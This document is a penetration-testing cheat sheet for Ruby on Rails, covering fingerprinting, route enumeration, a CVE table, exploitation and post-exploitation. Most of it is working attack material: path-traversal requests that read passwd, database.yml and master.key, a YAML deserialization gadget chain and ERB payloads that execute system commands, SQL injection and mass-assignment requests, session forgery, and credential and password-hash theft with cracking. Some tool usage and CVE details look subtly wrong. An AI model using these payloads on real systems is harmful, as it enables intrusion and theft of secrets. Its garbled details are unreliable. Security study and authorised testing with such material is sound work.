# Ruby on Rails

> Ruby web framework reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers / cookies

Rails sets distinctive headers and cookies:

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|x-powered-by|x-runtime|set-cookie|x-request-id)'
```

Expected output:

```text
X-Powered-By: Phusion Passenger 6.0.14
X-Runtime: 0.023451
X-Request-Id: 8f3a-...
Set-Cookie: _myapp_session=...; path=/; HttpOnly
```

Two strong fingerprints:
- `_<appname>_session` cookie (Rails convention: underscore prefix + `_session`)
- `X-Runtime` header (added by ActionDispatch::Runtime)
- `X-Request-Id` header

### Default error pages

Rails dev mode (`config.consider_all_requests_local = true`):

```text
Routing Error
No route matches [GET] "/nonexistent"
Rails.root: /home/user/myapp
Application Trace | Framework Trace | Full Trace
...
```

Dev error pages leak:
- Full file paths
- Full stack traces
- Source code snippets for the failing line
- Rails version
- Ruby version
- Gem versions

Rails prod mode -> generic `500 Internal Server Error` or custom error page.

Default Rails 404 (no custom handler) is the public/404.html:

```html
<!DOCTYPE html>
<html>
<head>
  <title>The page you were looking for doesn't exist (404)</title>
  ...
```

### Favicon

Rails default `favicon.ico` is served from `/favicon.ico`. Presence + no
other fingerprint is a weak signal.

### Headers on static assets

Rails asset pipeline fingerprints assets:

```bash
curl -sI http://<TARGET>/assets/application-abc123def.css | grep -iE 'etag|last-modified'
```

`/assets/<name>-<hash>.css` URL pattern is a strong Rails indicator.

### Server header

Rails behind Passenger: `Server: nginx` + `X-Powered-By: Phusion Passenger`.
Rails behind Puma: no `Server` header or `Server: Puma`.
Rails behind unicorn: `Server: nginx` or none.

### nmap / whatweb

```bash
nmap -sV -p 80,443,3000,8080 --script http-headers,http-title <TARGET>
whatweb -a 3 http://<TARGET>/
```

Default Rails dev port: `3000`.

---

## 2. Enumeration

### Standard Rails paths

```bash
for p in / /rails/info/properties /rails/info/routes /rails/mailers \
         /assets/ /packs/ /cable /up /healthz /admin /api /api/v1 \
         /users/sign_in /sidekiq /delayed_job; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### Dev info leak (`/rails/info/properties`)

In development mode, Rails exposes:

- `/rails/info/properties` -> Ruby version, Rails version, app root, middleware stack
- `/rails/info/routes` -> **complete route list** with controller#action

```bash
curl -s http://<TARGET>/rails/info/properties
curl -s http://<TARGET>/rails/info/routes
```

`/rails/info/routes` is the fastest way to get all endpoints.

### Common admin panels

```bash
for p in /admin /admin/login /administrator /sidekiq /delayed_job \
         /activeadmin /rails_admin /blazer /pghero /letter_opener; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

`/rails_admin` and `/activeadmin` are popular admin gems.
`/sidekiq` -> background job UI (often no auth in dev).
`/letter_opener` -> shows all outgoing mail (dev only, goldmine).

### Asset fingerprinting

```bash
curl -s http://<TARGET>/ | grep -oE '/assets/[^"]+\.(css|js)'
curl -s http://<TARGET>/ | grep -oE '/packs/[^"]+\.(css|js)'
```

Asset path leaks the asset pipeline config (Sprockets vs Webpacker).

### Route discovery via HTTP methods

Rails default `OPTIONS` response does not list methods like Apache.
Use brute force + `routes` file if leaked:

```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,201,301,302,401,403
```

### API enumeration (JSON)

Rails API responses typically include CSRF token:

```bash
curl -s http://<TARGET>/api/v1/users | jq .
```

If `respond_to :json` + `ActiveModel::Serializer`, response structure reveals
attribute names.

### Sidekiq / background job enumeration

```bash
curl -s http://<TARGET>/sidekiq/
curl -s http://<TARGET>/sidekiq/stats
```

If exposed without auth, sidekiq allows enqueuing jobs -> RCE (see section 4).

### Mailer previews (dev only)

```bash
curl -s http://<TARGET>/rails/mailers
curl -s http://<TARGET>/rails/mailers/user_mailer/welcome
```

---

## 3. Known CVEs

### CVE-2019-5418 / CVE-2019-5419 - Action View file disclosure / DoS

`ActionView::Template::Resolver` accepts `Accept` header with path traversal
-> arbitrary file read (`/etc/passwd`, `database.yml`).

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-5418
NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-5419
Affected: Rails 4.2.0 - 4.2.11.1, 5.0.0 - 5.0.7.2, 5.1.0 - 5.1.6.2, 5.2.0 - 5.2.2.1.

PoC:
```bash
curl -H "Accept: ../../../../../../etc/passwd{{" http://<TARGET>/user/1
curl -H "Accept: ../../../../../../etc/passwd{{" http://<TARGET>/api/users/1
```

Any endpoint that renders a view will attempt to read the file. The trailing
`{{` triggers ERB parsing; if the file contains ERB-looking syntax, may
additionally lead to code execution.

### CVE-2019-5420 - Development mode RCE

Rails in development mode with specific configs allows RCE via crafted
request to `/rails/info/routes` or via `SECRET_KEY_BASE` leak.
Chained with CVE-2019-5418.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-5420
Affected: Rails 5.2.0 - 5.2.2.1, 6.0.0.beta1 - 6.0.0.beta3.

### CVE-2020-8163 - RCE via `render file` + `_locals`

`render file: user_input, locals: user_data` -> RCE via the `locals` hash.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-8163
Affected: Rails < 5.2.4.3, < 6.0.3.1.

Requires specific app code (`render file:` with user-controlled locals).

### CVE-2020-8165 - Deserialization RCE

`Marshal.load` on user-controlled cookie / cache value -> RCE.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-8165
Affected: Rails 5.2.0 - 5.2.4.2, 6.0.0 - 6.0.3.0.

### CVE-2020-8164 - Deserialization (ActiveSupport)

Similar to CVE-2020-8165 via `ActiveSupport::Cache` and `Marshal`.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2020-8164
Affected: Rails 5.2.0 - 5.2.4.2, 6.0.0 - 6.0.3.0.

### CVE-2022-32224 - YAML deserialization RCE

`ActiveRecord::Coders::YAMLColumn` uses `YAML.load` (not `safe_load`)
-> RCE via YAML payload in a serialized column.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-32224
Affected: Rails 5.2.0 - 5.2.8.1, 6.0.0 - 6.0.5.1, 7.0.0 - 7.0.3.1.

### CVE-2023-22795 / CVE-2023-22794 - ReDoS / SQLi in `ActiveRecord`

- CVE-2023-22795: ReDoS in `ActionDispatch::Journey` (router)
- CVE-2023-22794: SQL injection via `sanitize_sql_like` + `where`

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-22795
NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-22794
Affected: Rails 7.0.4.1 and earlier, 6.1.7.1 and earlier.

### CVE-2024-26141 / CVE-2024-26143 - ReDoS / XSS

- CVE-2024-26141: ReDoS in `Range` parsing
- CVE-2024-26143: XSS in `ActionController::Parameters` (nested)

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-26141
NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-26143
Affected: Rails 7.1.3 and earlier, 7.0.8 and earlier.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 4.2-5.2 | File disclosure | CVE-2019-5418 |
| 5.2.0-5.2.2.1 | Dev mode RCE | CVE-2019-5420 |
| < 5.2.4.3, < 6.0.3.1 | RCE via locals | CVE-2020-8163 |
| 5.2.0-5.2.4.2, 6.0.0-6.0.3.0 | Deser | CVE-2020-8165 / 8164 |
| 5.2-7.0.3.1 | YAML deser | CVE-2022-32224 |
| 7.1.3 and earlier | ReDoS/XSS | CVE-2024-26141 / 26143 |

---

## 4. Exploitation Patterns

### CVE-2019-5418 file disclosure

Requires any endpoint that renders a view:

```bash
curl -H "Accept: ../../../../../../etc/passwd{{" http://<TARGET>/users/1
curl -H "Accept: ../../../../../../app/config/database.yml{{" http://<TARGET>/users/1
curl -H "Accept: ../../../../../../app/config/credentials.yml.enc{{" http://<TARGET>/users/1
```

Expected output (passwd):

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Try variations:

```bash
# Rails 5.2.2.1 and earlier (CVE-2019-5418)
curl -H "Accept: ../../../../../../etc/passwd{{" http://<TARGET>/
curl -H "Accept: aaa/../../../../etc/passwd{{,a/b/c" http://<TARGET>/
```

### Dev mode + leaked credentials -> RCE

If `config.credentials.yml.enc` + `config/master.key` are both readable
(dev mode with source leak):

```bash
# Read encrypted credentials
curl -H "Accept: ../../../../../../app/config/credentials.yml.enc{{" http://<TARGET>/users/1
curl -H "Accept: ../../../../../../app/config/master.key{{" http://<TARGET>/users/1

# Decrypt locally
rails credentials:edit --key $(cat master.key)
```

Credentials contain: `secret_key_base`, DB passwords, AWS keys, third-party
tokens.

### SECRET_KEY_BASE -> session forgery

Rails session cookies are signed with HMAC using `secret_key_base`. If the key
leaks (via CVE-2019-5418 reading credentials, or source leak):

```bash
# Decode current session
# Rails uses AES-256-GCM with derived keys from secret_key_base
# Tools: rails_session_decoder / marcel's script
git clone https://github.com/marcelsavegnago/rails-secret-key-base-session-cookie-decoder
ruby rails-secret-key-base-session-cookie-decoder/decode.rb --secret <leaked> --cookie <_session cookie>
```

Then re-sign:

```bash
# Forge session with arbitrary user_id / role
ruby forge_session.rb --secret <leaked> --data '{"user_id":1,"role":"admin"}'
```

### Marshal deserialization (CVE-2020-8165 / 8164)

If the app deserializes user-controlled cookies / cache with `Marshal.load`:

```ruby
# Generate payload
require 'base64'
payload = Marshal.dump(['Rack::Session::Cookie::MarshalEncoder',
  { 'session_id' => 'x', 'user_id' => 1 }])  # example
puts Base64.strict_encode64(payload)
```

Actual exploit uses `universal_gadget_chain` for Ruby:

```bash
gem install universal_gadget_chain
ruby -e "require 'universal_gadget_chain'; require 'base64'; puts Base64.encode64(UniversalGadgetChain::Payload.new(cmd: 'id').to_s)"
```

Then set as the cookie / cache value.

### YAML deserialization (CVE-2022-32224)

If a serialized column stores YAML and user controls it:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

Send via the vulnerable endpoint (parameters that hit `YAML.load`).

### Sidekiq no-auth -> RCE

If `/sidekiq` is exposed without auth and the app has a job class that can be
triggered with arbitrary arguments:

1. Visit `/sidekiq`.
2. Enqueue a job for a class with an RCE-capable `perform` method.
3. If the app has a generic job like `SystemCommand.perform(cmd)`, done.

Not exploitable generically; requires app-specific job classes.

### ERB template injection

If user input reaches `ERB.new(...)`:

```bash
curl "http://<TARGET>/page?name=<%25= 7*7 %25>"
curl "http://<TARGET>/page?name=<%25= system('id') %25>"
```

### Mass assignment

Older Rails apps without strong parameters accept `user[is_admin]=1`:

```bash
curl -X POST http://<TARGET>/users \
  -d "user[username]=attacker" \
  -d "user[password]=secret" \
  -d "user[is_admin]=1"
```

Check response for elevated role.

### SQL injection via `where` with string interpolation

```bash
curl "http://<TARGET>/users?search=admin') OR '1'='1"
curl "http://<TARGET>/users?id=1 OR 1=1"
```

`sqlmap` with `--dbms=postgresql` (or mysql/sqlite):

```bash
sqlmap -u "http://<TARGET>/users?id=1" --dbms=postgresql --level=5 --risk=3
```

---

## 5. Misconfigurations

### Development mode in production

`config.consider_all_requests_local = true` exposes:

- Full stack traces with source snippets
- `/rails/info/properties` and `/rails/info/routes`
- `/rails/mailers` (mail previews)
- Detailed DB errors

```bash
curl -s http://<TARGET>/rails/info/routes | head -30
curl -s http://<TARGET>/rails/info/properties
```

### `secret_key_base` in env / source

Look for leaked key in `.env`, `config/secrets.yml`, or source:

```bash
for f in .env .env.bak config/secrets.yml config/secrets.yml.bak config/master.key config/credentials.yml.enc; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

### Sidekiq dashboard exposed

```bash
curl -s http://<TARGET>/sidekiq/ | grep -iE 'sidekiq|dashboard'
```

Requires auth via `Sidekiq::Web.use Rack::Auth::Basic` normally. If exposed,
enqueue jobs (see section 4).

### Rails admin exposed with weak creds

```bash
curl -s http://<TARGET>/admin | grep -iE 'rails_admin|activeadmin'
```

Default RailsAdmin: no default creds, but often `admin@example.com` / `password`.

### Letter opener (mail interception)

```bash
curl -s http://<TARGET>/letter_opener | grep -iE 'letter|mail'
```

If exposed in production, all sent emails (password resets, invites, MFA) are
readable -> account takeover.

### CORS misconfig

```bash
curl -sI -H "Origin: https://evil.com" http://<TARGET>/api/ | grep -i 'access-control'
```

### Open redirect via `redirect_to params[:return_to]`

```bash
curl "http://<TARGET>/login?return_to=https://evil.com"
curl "http://<TARGET>/login?return_to=//evil.com"
```

### Exposed schema.rb

```bash
curl -s http://<TARGET>/schema.rb
curl -s http://<TARGET>/db/schema.rb
```

Reveals full DB schema -> guides SQLi extraction.

### Exposed routes.txt

```bash
curl -s http://<TARGET>/routes.txt
curl -s http://<TARGET>/config/routes.rb
```

---

## 6. Post-Exploitation

### Config file locations

| Layout | Path |
|--------|------|
| Standard | `<app>/config/` |
| Credentials | `<app>/config/credentials.yml.enc` + `config/master.key` |
| Secrets | `<app>/config/secrets.yml`, `<app>/config/database.yml` |
| Env | `<app>/.env`, `/etc/environment` |
| Deployment | `<app>/config/deploy.rb`, `Capfile` |
| Docker | `/app/config/`, `/rails/config/` |

### What to look for

```bash
find / -name 'database.yml' -o -name 'secrets.yml' -o -name 'master.key' 2>/dev/null
cat /app/config/database.yml
cat /app/config/master.key
grep -rE 'secret_key_base|password|api_key|token' /app/config/ 2>/dev/null
```

Key items:

- `database.yml` -> DB user/password/host
- `master.key` + `credentials.yml.enc` -> decrypt all secrets with `rails credentials:edit`
- `secrets.yml` -> legacy secret store
- `config/environments/production.rb` -> security config flags
- `.env` -> environment-based secrets

### Decrypt credentials

With `master.key` and `credentials.yml.enc`:

```bash
EDITOR=nano rails credentials:show
# Or:
RAILS_MASTER_KEY=$(cat master.key) rails credentials:show
```

Yields: `secret_key_base`, DB passwords, AWS keys, Stripe keys, SMTP creds,
JWT secrets.

### Database access

From `database.yml`:

```bash
psql -h <host> -U <user> -d <db> -W
# Or:
mysql -h <host> -u <user> -p<password> <db>
```

Dump users:

```sql
SELECT id, email, encrypted_password, admin FROM users;
```

Rails password hash format (bcrypt):

```text
$2a$12$<22-char-salt><31-char-hash>
```

Crack with hashcat mode 3200:

```bash
hashcat -m 3200 rails_hashes.txt rockyou.txt
```

### Session table

If `ActiveRecord::SessionStore`:

```sql
SELECT session_id, data FROM sessions;
```

`data` is base64-encoded Marshal. Decode:

```bash
echo '<data>' | base64 -d | ruby -e "require 'pp'; pp Marshal.load(STDIN.read)"
```

### Logs

```bash
ls -la /app/log/ /var/log/rails/ 2>/dev/null
tail -n 200 /app/log/production.log
```

Rails logs include full request params (including passwords on failed logins)
and SQL queries (with values, unless `config.filter_parameters` is set).

### Job queue (Sidekiq / Delayed Job / Resque)

With Redis access:

```bash
redis-cli -h <redis>
> keys sidekiq:*
> lrange queue:default 0 -1
```

Job args often contain credentials, user IDs, internal URLs.

### `rails console`

With shell access:

```bash
cd /app && RAILS_ENV=production rails console
# Or:
bundle exec rails runner 'puts User.all.map(&:email)'
```

`rails console` = arbitrary Ruby + DB access + file system.

### Ruby gem RCE

Enumerate gems for known-vulnerable versions:

```bash
gem list
bundle list
```

Common vulnerable gems:

- `nokogiri` < 1.11 -> libxml2 CVEs
- `rack` < 2.2.3 -> CVE-2022-30122 (multipart DoS)
- `puma` < 5.6.4 -> CVE-2022-24790 (HTTP smuggling)
- `devise` < 4.8.1 -> CVE-2021-43177 (password reset)

### `respond_to` format-based file disclosure

Some apps respond to multiple formats:

```bash
curl http://<TARGET>/users/1.json
curl http://<TARGET>/users/1.xml
curl http://<TARGET>/users/1.yaml
```

`.yaml` / `.xml` responses may reveal more fields than `.json`.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `_<app>_session` cookie AND the `X-Runtime` header - together they identify Rails.

> [!IMPORTANT]
> OSCP report: for CVE-2019-5418, screenshot the crafted `Accept:` header AND the file content in response (`/etc/passwd` line or `database.yml` line).

> [!IMPORTANT]
> OSCP report: if you forge a session with leaked `secret_key_base`, screenshot the leaked key (from credentials or env) AND the successful admin request.

---

## 8. References

- Rails official docs - https://guides.rubyonrails.org/
- Rails security guide - https://guides.rubyonrails.org/security.html
- NVD search - https://nvd.nist.gov/vuln/search/results?query=rails
- CVE-2019-5418 writeup - https://github.com/mpgn/CVE-2019-5418
- CVE-2019-5420 writeup - https://github.com/mpgn/Rails-doubletap-RCE
- Rails session cookie decode - https://github.com/marcelsavegnago/rails-secret-key-base-session-cookie-decoder
- HackTricks - Rails - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/ruby-on-rails
- universal_gadget_chain - https://github.com/Coalfire-Research/universal-gadget-chain

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
